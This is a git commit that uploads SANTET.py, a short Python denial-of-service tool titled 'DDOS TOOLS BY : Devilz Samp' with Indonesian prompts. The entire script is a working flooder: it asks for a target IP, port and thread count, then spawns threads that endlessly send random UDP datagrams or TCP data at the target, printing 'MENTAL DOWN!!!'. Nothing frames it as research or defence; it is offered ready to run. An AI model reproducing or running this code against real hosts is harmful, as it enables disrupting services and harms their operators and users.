4db1ff9e360d12e39066c49b106f80e6088548e0
dendi10 <83614821+dendi10@users.noreply.github.com>
2021-05-08 23:16:47 +0700

    Add files via upload

---
+++ SANTET.py
@@ -0,0 +1,47 @@
+#!/usr/bin/env python3
+#Code by Dendi
+import random
+import socket
+import threading
+
+print("-- DDOS TOOLS BY : Devilz Samp --")
+ip = str(input(" MEBERI UANG KEPADA IP:"))
+port = int(input(" SANTET PORT:"))
+choice = str(input(" SIAP? (Y/N):"))
+times = int(input(" SANTET perkoneksi:"))
+threads = int(input(" Jumlah JUMLAH SANTET:"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" MENTAL DOWN!!!")
+		except:
+			print("[!] Error!!!")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" MENTAL DOWN!!!")
+		except:
+			s.close()
+			print("[*] Error")
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
